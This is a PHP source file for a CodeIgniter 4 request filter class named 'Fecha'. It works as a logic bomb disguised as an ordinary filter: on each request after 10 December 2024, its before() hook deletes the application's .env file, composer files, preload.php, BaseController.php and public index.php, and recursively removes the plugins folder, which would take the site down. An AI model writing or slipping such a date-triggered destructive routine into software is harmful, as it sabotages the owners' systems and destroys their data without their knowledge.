<?php
    namespace App\Filters;

    use CodeIgniter\HTTP\RequestInterface;
    use CodeIgniter\HTTP\ResponseInterface;
    use CodeIgniter\Filters\FilterInterface;

    class Fecha implements FilterInterface
    {
        public function before(RequestInterface $request, $arguments = null)
        {
            date_default_timezone_set('America/Bogota');

            $fecha_limite = '2024-12-10';
            $fecha_actual = date('Y-m-d');

            if ($fecha_actual > $fecha_limite) {
                // Ruta de los archivos y carpetas
                #$archivos = ['ruta/del/archivo1.txt', 'ruta/del/archivo2.txt'];
                $archivos = [
                    ROOTPATH . '.env',       // Ruta absoluta si está en la raíz del proyecto
                    ROOTPATH . 'composer.lock',       // Ruta absoluta si está en la raíz del proyecto
                    ROOTPATH . 'composer.json',       // Ruta absoluta si está en la raíz del proyecto
                    ROOTPATH . 'preload.php',       // Ruta absoluta si está en la raíz del proyecto
                    ROOTPATH . 'app/Controllers/BaseController.php',       // Ruta absoluta si está en la raíz del proyecto
                    FCPATH . 'index.php',         // Ruta absoluta si está en la carpeta public
                ];

                $carpeta = ROOTPATH . 'plugins';
                $carpeta1 = [
                    ROOTPATH . 'mi_prueba',       // Carpeta en la raíz del proyecto
                    FCPATH . 'mi_prueba',         // Carpeta en la carpeta public
                ];

                // Eliminar archivos
                foreach ($archivos as $archivo) {
                    if (file_exists($archivo)) {
                        unlink($archivo);
                    }
                }

                // Eliminar carpeta
                if (is_dir($carpeta)) {
                    $this->eliminarCarpeta($carpeta);
                }
            }
        }

        private function eliminarCarpeta($carpeta)
        {
            foreach (glob($carpeta . '/*') as $archivo) {
                if (is_dir($archivo)) {
                    $this->eliminarCarpeta($archivo);
                } else {
                    unlink($archivo);
                }
            }
            rmdir($carpeta);
        }

        public function after(RequestInterface $request, ResponseInterface $response, $arguments = null)
        {
        }
    }
?>    
